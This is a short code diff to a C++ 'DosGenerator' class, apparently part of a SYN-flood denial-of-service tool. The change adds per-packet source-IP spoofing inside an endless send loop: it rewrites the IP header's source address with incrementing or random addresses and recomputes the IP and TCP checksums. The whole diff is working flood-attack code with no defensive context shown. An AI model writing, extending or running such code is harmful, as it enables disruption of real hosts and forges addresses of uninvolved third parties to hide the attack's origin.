@@ -138,6 +138,12 @@ void DosGenerator::generate()
     dst_addr.sin_port = tcph_.dest;
 
 
+    struct iphdr * iph;
+    iph = (struct iphdr *)packet;
+
+
+
+
     while(power_)
     {
         //infinity send until power off
@@ -145,8 +151,16 @@ void DosGenerator::generate()
         {
             std::cout<<"send to error! here's packet."<<std::endl;
             printByHexData(packet,sizeof(packet));
-
         }
+//        target_ip_.set_rand_ip();
+        if(!target_ip_.inc_ip_addr())
+        {
+            std::cout<<"Call!!!"<<std::endl;
+            target_ip_.set_rand_ip();
+        }
+        memcpy(&iph->saddr,target_ip_.get_ip_ptr(),4);
+        calIPChecksum((uint8_t*)iph);
+        calTCPChecksum((uint8_t*)iph,sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions));
     }
 
 
